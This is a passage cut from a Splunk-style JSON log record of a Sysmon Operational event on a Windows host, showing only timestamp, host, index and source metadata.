19:50:52.627","_time":"2022-11-29T12:50:52.000-0800","host":"WIN-AOQKG2AS2Q7","index":"main","linecount":"22","punct":"//_::_=--/===-..==---==--====__(:_)==_:\\r:_\\r:_--_::","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational"}}
